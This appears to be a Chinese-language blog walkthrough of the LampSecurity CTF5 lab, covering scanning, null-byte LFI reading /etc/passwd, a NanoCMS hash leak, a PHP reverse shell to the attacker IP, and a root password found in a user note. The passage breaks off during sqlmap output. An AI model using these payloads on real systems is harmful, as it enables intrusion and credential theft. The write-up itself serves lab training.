[{"title":"[vulnhub]  LampSec-CTF5","url":"/2023/05/24/LAMPSECURITY%20CTF5_my/","content":"\n\n\nInfo Gathernmap┌──(kali㉿kali)-[~]└─$ sudo nmap -sn 192.168.56.0/24                     [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:38 CSTNmap scan report for 192.168.56.1Host is up (0.00013s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.00013s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.139Host is up (0.00063s latency).MAC Address: 00:0C:29:7D:00:15 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00042s latency).MAC Address: 00:50:56:FE:21:A5 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.08 seconds\n\n┌──(kali㉿kali)-[~]└─$ sudo nmap -p- --min-rate=10000 192.168.56.139Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:40 CSTNmap scan report for 192.168.56.139Host is up (0.0017s latency).Not shown: 65524 closed tcp ports (reset)PORT      STATE SERVICE22/tcp    open  ssh25/tcp    open  smtp80/tcp    open  http110/tcp   open  pop3111/tcp   open  rpcbind139/tcp   open  netbios-ssn143/tcp   open  imap445/tcp   open  microsoft-ds901/tcp   open  samba-swat3306/tcp  open  mysql53728/tcp open  unknownMAC Address: 00:0C:29:7D:00:15 (VMware)Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds\n开了这么多端口，如此多的可能性。可能比较好用的攻击向量：80-web, 139&amp;445-samba然后是：53728，901，25，110，111剩下其他的最后看。\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.139                          Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:48 CSTWarning: 192.168.56.139 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.139Host is up (0.0014s latency).Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)PORT      STATE SERVICE111/udp   open  rpcbind5353/udp  open  zeroconf32768/udp open  omadMAC Address: 00:0C:29:7D:00:15 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.70 second\n都可以看看。\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -O -p22,25,80,110,111,139,143,445,901,3306,5353,32768,53728 192.168.56.139Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:54 CSTNmap scan report for 192.168.56.139Host is up (0.00098s latency).PORT      STATE  SERVICE     VERSION22/tcp    open   ssh         OpenSSH 4.7 (protocol 2.0)25/tcp    open   smtp        Sendmail 8.14.1/8.14.180/tcp    open   http        Apache httpd 2.2.6 ((Fedora))110/tcp   open   pop3        ipop3d 2006k.101111/tcp   open   rpcbind     2-4 (RPC #100000)139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)143/tcp   open   imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)445/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)901/tcp   open   http        Samba SWAT administration server3306/tcp  open   mysql       MySQL 5.0.455353/tcp  closed mdns32768/tcp closed filenet-tms53728/tcp open   status      1 (RPC #100024)MAC Address: 00:0C:29:7D:00:15 (VMware)Device type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6OS details: Linux 2.6.9 - 2.6.30Network Distance: 1 hopService Info: Hosts: localhost.localdomain, 192.168.56.139; OS: UnixOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.11 seconds\n\n┌──(kali㉿kali)-[~]└─$ sudo nmap --script=vuln 192.168.56.139Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:55 CSTPre-scan script results:| broadcast-avahi-dos: |   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for 192.168.56.139Host is up (0.0014s latency).Not shown: 990 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh25/tcp   open  smtp| smtp-vuln-cve2010-4344: |_  The SMTP server is not Exim: NOT VULNERABLE80/tcp   open  http| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.139|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.139:80/?page=contact|     Form id: |     Form action: ?page=contact|     |     Path: http://192.168.56.139:80/events/|     Form id: user-login-form|     Form action: /events/?q=node&amp;destination=node|     |     Path: http://192.168.56.139:80/events/?q=user/register|     Form id: user-register|     Form action: /events/?q=user/register|     |     Path: http://192.168.56.139:80/events/?q=user/password|     Form id: user-pass|     Form action: /events/?q=user/password|     |     Path: http://192.168.56.139:80/events/?q=event/2009/04/29|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event/2009/04/29|     |     Path: http://192.168.56.139:80/events/?q=event/2009/04/29|     Form id: event-type-filter-form|     Form action: /events/?q=event/2009/04/29|     |     Path: http://192.168.56.139:80/events/?q=event/2009/04/29|     Form id: user-login-form|     Form action: /events/?q=event/2009/04/29&amp;destination=event%2F2009%2F04%2F29|     |     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event/2023/04/26/month|     |     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month|     Form id: event-type-filter-form|     Form action: /events/?q=event/2023/04/26/month|     |     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month|     Form id: user-login-form|     Form action: /events/?q=event/2023/04/26/month&amp;destination=event%2F2023%2F04%2F26%2Fmonth|     |     Path: http://192.168.56.139:80/events/?q=event|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event|     |     Path: http://192.168.56.139:80/events/?q=event|     Form id: event-type-filter-form|     Form action: /events/?q=event|     |     Path: http://192.168.56.139:80/events/?q=event|     Form id: user-login-form|     Form action: /events/?q=event&amp;destination=event|     |     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1|     Form id: event-taxonomy-filter-form|     Form action: /events/?q=event/2023/03/01/month/all/all/1|     |     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1|     Form id: event-type-filter-form|     Form action: /events/?q=event/2023/03/01/month/all/all/1|     |     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1|     Form id: user-login-form|     Form action: /events/?q=event/2023/03/01/month/all/all/1&amp;destination=event%2F2023%2F03%2F01%2Fmonth%2Fall%2Fall%2F1|     |     Path: http://192.168.56.139:80/events/?q=node&amp;amp;destination=node|     Form id: user-login-form|     Form action: /events/?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode|     |     Path: http://192.168.56.139:80/events/?q=blog|     Form id: user-login-form|     Form action: /events/?q=blog&amp;destination=blog|     |     Path: http://192.168.56.139:80/events/?q=comment/reply/2|     Form id: comment-form|     Form action: /events/?q=comment/reply/2|     |     Path: http://192.168.56.139:80/events/?q=comment/reply/2|     Form id: user-login-form|     Form action: /events/?q=comment/reply/2&amp;destination=comment%2Freply%2F2|     |     Path: http://192.168.56.139:80/events/?q=node/2|     Form id: user-login-form|     Form action: /events/?q=node/2&amp;destination=node%2F2|     |     Path: http://192.168.56.139:80/events/?q=blog/1|     Form id: user-login-form|_    Form action: /events/?q=blog/1&amp;destination=blog%2F1|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-enum: |   /info.php: Possible information file|   /phpmyadmin/: phpMyAdmin|   /squirrelmail/src/login.php: squirrelmail version 1.4.11-1.fc8|   /squirrelmail/images/sm_logo.png: SquirrelMail|   /icons/: Potentially interesting folder w/ directory listing|_  /inc/: Potentially interesting folder| http-fileupload-exploiter: |   |_    Couldn&#x27;t find a file-type field.|_http-trace: TRACE is enabled| http-sql-injection: |   Possible sqli for queries:|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|_    http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.110/tcp  open  pop3111/tcp  open  rpcbind139/tcp  open  netbios-ssn143/tcp  open  imap445/tcp  open  microsoft-ds901/tcp  open  samba-swat3306/tcp open  mysql|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)MAC Address: 00:0C:29:7D:00:15 (VMware)Host script results:|_smb-vuln-ms10-061: false|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)|_smb-vuln-ms10-054: falseNmap done: 1 IP address (1 host up) scanned in 170.56 seconds\nhttp-enum和http-sql-injection部分挺让人感兴趣。之后重点看看。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo nikto -h 192.168.56.139          [sudo] password for kali: - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.139+ Target Hostname:    192.168.56.139+ Target Port:        80+ Start Time:         2023-04-26 16:29:26 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.2.6 (Fedora)+ /: Retrieved x-powered-by header: PHP/5.2.4.+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ Apache/2.2.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing+ /index.php: PHP include error may indicate local or remote file inclusion is possible.+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ /phpmyadmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Tue Aug 21 10:59:12 2029. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418+ /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ /mail/src/read_body.php: Cookie SQMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ /mail/src/read_body.php: SquirrelMail found.+ /squirrelmail/src/read_body.php: SquirrelMail found.+ /info.php: Output from the phpinfo() function was found.+ /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552+ /icons/: Directory indexing found.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2+ /phpmyadmin/: phpMyAdmin directory found.+ /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 8908 requests: 0 error(s) and 26 item(s) reported on remote host+ End Time:           2023-04-26 16:29:51 (GMT8) (25 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nExploitRFI（F）之前nikto中发现/info.php?file=可能存在远程文件包含，实际试了一下发现并不行。\nSQLi（F）再看看sql注入，如果能直接拿到登录凭证那美滋滋。先sqlmap扫一下[http://192.168.56.139:80/events/?q=event%2Fical](http://192.168.56.139:80/events/?q=event%2Fical)，发现没有注入点。手动看看发现是下载一个文件。再sqlmap扫一下[http://192.168.56.139:80/?page=contact](http://192.168.56.139:80/?page=contact)，还是没有注入点。\nLFI（F）直接访问发现报错，报错信息如下\nsudo curl &#x27;http://192.168.56.139/?page=../../../../../../../etc/passwd&#x27;&lt;div id=&quot;main&quot;&gt;&lt;b&gt;Warning&lt;/b&gt;:  include_once(inc/../../../../../../../etc/passwd.php) [&lt;a href=&#x27;function.include-once&#x27;&gt;function.include-once&lt;/a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;&lt;b&gt;Warning&lt;/b&gt;:  include_once() [&lt;a href=&#x27;function.include&#x27;&gt;function.include&lt;/a&gt;]: Failed opening &#x27;inc/../../../../../../../etc/passwd.php&#x27; for inclusion (include_path=&#x27;.:/usr/share/pear:/usr/share/php&#x27;) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;&lt;/div&gt;\n一眼文件包含漏洞，由于后面有.php，我们之前看phpinfo页面发现此PHP版本存在0字符截断漏洞。直接截断。\n# http://192.168.56.139/?page=../../../../../../../etc/passwd%00root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin polkituser:x:87:87:PolicyKit:/:/sbin/nologin avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash andy:x:502:502:Andrew Carp:/home/andy:/bin/bash loren:x:503:503:Loren Felt:/home/loren:/bin/bash amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash\n可看到/etc/passwd内容，可惜看不到shadow的内容，想看看配置信息啥的无果。先暂时搁置这个漏洞。\nSamba（F）┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.56.139[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 16:54 CSTNmap scan report for 192.168.56.139Host is up (0.00053s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsMAC Address: 00:0C:29:7D:00:15 (VMware)Host script results:| smb-enum-shares: |   account_used: &lt;blank&gt;|   \\\\192.168.56.139\\IPC$: |     Type: STYPE_IPC_HIDDEN|     Comment: IPC Service (Samba Server Version 3.0.26a-6.fc8)|     Users: 1|     Max Users: &lt;unlimited&gt;|     Path: C:\\tmp|_    Anonymous access: READ/WRITE| smb-enum-users: |   LOCALHOST\\amy (RID: 2008)|     Full name:   Amy Pendelton|     Flags:       Normal user account|   LOCALHOST\\andy (RID: 2004)|     Full name:   Andrew Carp|     Flags:       Normal user account|   LOCALHOST\\jennifer (RID: 2002)|     Full name:   Jennifer Sea|     Flags:       Normal user account|   LOCALHOST\\loren (RID: 2006)|     Full name:   Loren Felt|     Flags:       Normal user account|   LOCALHOST\\patrick (RID: 2000)|     Full name:   Patrick Fair|_    Flags:       Normal user accountNmap done: 1 IP address (1 host up) scanned in 4.12 seconds\n看看我们的samba服务吧，扫出了各用户名以及共享的地址再用smbmap扫一下\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ smbmap -H 192.168.56.139                 [+] IP: 192.168.56.139:445      Name: unknown                                           Disk        Permissions     Comment----        -----------     -------homes       NO ACCESS       Home DirectoriesIPC$        NO ACCESS       IPC Service (Samba Server Version 3.0.26a-6.fc8)\n得，都是NO ACCESS。寄\n# Not usehydra -l andy -P /usr/share/wordlists/rockyou.txt 192.168.56.139 http-post-form &quot;/~andy/data/nanoadmin.php:SQMSESSID=b2pdpdkh3rlkvukqr0jbssur30; PHPSESSID=7rlrvoh72sto2t935mmr4l99e0; SESS100a7dde408e54bc0d12aead519a7cc5=i1u9c4qe9er2gu0r1ou19tqhj1;user=^USER^&amp;pass=^PASS^:F=wrong Username or Password&quot;Cookie: SQMSESSID=b2pdpdkh3rlkvukqr0jbssur30; PHPSESSID=7rlrvoh72sto2t935mmr4l99e0; SESS100a7dde408e54bc0d12aead519a7cc5=i1u9c4qe9er2gu0r1ou19tqhj1Upgrade-Insecure-Requests: 1user=1111&amp;pass=2222\n\nNanoCMS（S）在后台登录界面，我们可以发现cms是nanocms，在exp-db上查一下，发现只有一个已登录用户的RCE漏洞。再在搜索引擎查一查search in bing: nanocms exploit，发现nanoCMS存在一个数据泄露漏洞。虽然不知道nanocms的版本，但是还是试试吧，死马当活马医。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ curl http://192.168.56.139/~andy/data/pagesdata.txta:12:&#123;s:8:&quot;homepage&quot;;s:1:&quot;1&quot;;s:10:&quot;links_cats&quot;;a:4:&#123;s:7:&quot;sidebar&quot;;a:2:&#123;i:0;i:1;i:1;i:4;&#125;s:11:&quot;other-pages&quot;;a:0:&#123;&#125;s:14:&quot;top-navigation&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;s:12:&quot;Footer-Right&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;&#125;s:5:&quot;slugs&quot;;a:2:&#123;i:1;s:4:&quot;home&quot;;i:4;s:7:&quot;contact&quot;;&#125;s:6:&quot;titles&quot;;a:2:&#123;i:1;s:4:&quot;Home&quot;;i:4;s:7:&quot;Contact&quot;;&#125;s:10:&quot;slug_count&quot;;i:12;s:8:&quot;settings&quot;;a:3:&#123;s:19:&quot;index-last-modified&quot;;i:1234513760;s:18:&quot;def-template-areas&quot;;a:4:&#123;i:0;s:12:&quot;website name&quot;;i:2;s:14:&quot;website slogan&quot;;i:3;s:16:&quot;below navigation&quot;;i:4;s:16:&quot;copyright notice&quot;;&#125;s:18:&quot;def-template-links&quot;;a:2:&#123;i:0;s:14:&quot;top-navigation&quot;;i:1;s:12:&quot;Footer-Right&quot;;&#125;&#125;s:13:&quot;active-tweaks&quot;;a:2:&#123;i:0;s:7:&quot;deutsch&quot;;i:1;s:19:&quot;language-pack-tweak&quot;;&#125;s:11:&quot;lang-select&quot;;s:7:&quot;english&quot;;s:6:&quot;seourl&quot;;s:1:&quot;0&quot;;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;s:7:&quot;version&quot;;s:4:&quot;v_4f&quot;;&#125;   \n发现竟然爆出了username和password。直接把md5值的密码丢去破解。OK登录后台OK四处找了找，发现可以编辑页面的地方，决定隐蔽点在contact页面插个反弹shell。\n&lt;?php exec(&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.132/8080 0&gt;&amp;1&#x27;&quot;) ?&gt;\n成功获取shell。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo nc -lvp 443 listening on [any] 443 ...192.168.56.139: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.139] 54757bash: no job control in this shellbash-3.2$ whoamiapachebash-3.2$ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:fe7d:15/64 scope link        valid_lft forever preferred_lft foreverbash-3.2$\nPriv Esudo -l need password.\nfind / -type f -perm -04000 -ls 2&gt;/dev/null没有有价值的，at用了总是失败，其他没有啥能用的。\nbash-3.2$ cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/# run-parts01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly\n一个个去定时任务文件夹里看了一遍，研究了下&#x2F;etc&#x2F;cron.daily里的一个定时任务，没发现可以利用的东西。\n传一下lse.sh上去，执行后发现这个shell不支持颜色显示语法，可读性极差。。。换成linpeas，发现可以正常显示颜色。还得是他。可惜还是没有提供特别有用的信息，虽然此系统版本很低，很有可能可以内核提权，但是，太不稳定了，还是不试了。\n看了下视频思路：\n\nThere so many user in the system that maybe some of them would left credentials in their files. So why not take a try?多用户环境下，保不齐会有带路党，反正试试不吃亏。\n\n所以我们递归忽略大小写搜一下/home下的文件里的pass字段\n# -R recursion -i ignore Capgrep -R -i pass /home/* 2&gt;/dev/null\n\n/home/andy/public_html/data/admin-design/loginform.php:    &lt;tr&gt;&lt;td&gt;&lt;?php _lt(&#x27;Password&#x27;); ?&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&#x27;password&#x27; name=&#x27;pass&#x27;&gt;&lt;/td&gt;&lt;/tr&gt;/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;title&gt;Root password&lt;/title&gt;/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;text xml:space=&quot;preserve&quot;&gt;&lt;note-content version=&quot;0.1&quot;&gt;Root password/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password/home/patrick/.tomboy.log:12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password/home/patrick/.tomboy.log:12/5/2012 7:24:56 AM [DEBUG]: Saving &#x27;Root password&#x27;.../home/patrick/.tomboy.log:12/5/2012 7:25:03 AM [DEBUG]: Saving &#x27;Root password&#x27;...\n\n# cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note version=&quot;0.2&quot; xmlns:link=&quot;http://beatniksoftware.com/tomboy/link&quot; xmlns:size=&quot;http://beatniksoftware.com/tomboy/size&quot; xmlns=&quot;http://beatniksoftware.com/tomboy&quot;&gt;  &lt;title&gt;Root password&lt;/title&gt;  &lt;text xml:space=&quot;preserve&quot;&gt;&lt;note-content version=&quot;0.1&quot;&gt;Root passwordRoot password50$cent&lt;/note-content&gt;&lt;/text&gt;  &lt;last-change-date&gt;2012-12-05T07:24:52.7364970-05:00&lt;/last-change-date&gt;  &lt;create-date&gt;2012-12-05T07:24:34.3731780-05:00&lt;/create-date&gt;  &lt;cursor-position&gt;15&lt;/cursor-position&gt;  &lt;width&gt;450&lt;/width&gt;  &lt;height&gt;360&lt;/height&gt;  &lt;x&gt;0&lt;/x&gt;  &lt;y&gt;0&lt;/y&gt;  &lt;open-on-startup&gt;False&lt;/open-on-startup&gt;&lt;/note&gt;\n密码发现，存的还是root密码，离谱。\nash-3.2$ susuPassword: 50$cent[root@localhost bin]# whoamiwhoamiroot[root@localhost bin]# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:fe7d:15/64 scope link        valid_lft forever preferred_lft forever[root@localhost bin]#\n搞定。\n补充实际上测试SQLi的时候还是不够细，光想着url里的参数了。老惦记那BGET方法干吗。真得想想POST的事吧。在192.168.56.139/list/页面中，4个form输入框存在SQLi漏洞，加个&#39;试出来了。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]└─$ sudo sqlmap -u http://192.168.56.139/list/ --data &#x27;name=1&amp;email=&amp;phone=&amp;org=&#x27;         ___       __H__                                                                                     ___ ___[&quot;]_____ ___ ___  &#123;1.7.2#stable&#125;                                                        |_ -| . [&quot;]     | .&#x27;| . |                                                                       |___|_  [)]_|_|_|__,|  _|                                                                             |_|V...       |_|   https://sqlmap.org                                                    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 15:16:57 /2023-04-27/[15:16:57] [WARNING] provided value for parameter &#x27;email&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[15:16:57] [WARNING] provided value for parameter &#x27;phone&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[15:16:57] [WARNING] provided value for parameter &#x27;org&#x27; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[15:16:57] [INFO] testing connection to the target URL[15:16:58] [INFO] testing if the target URL content is stable[15:16:58] [INFO] target URL content is stable[15:16:58] [INFO] testing if POST parameter &#x27;name&#x27; is dynamic[15:16:58] [WARNING] POST parameter &#x27;name&#x27; does not appear to be 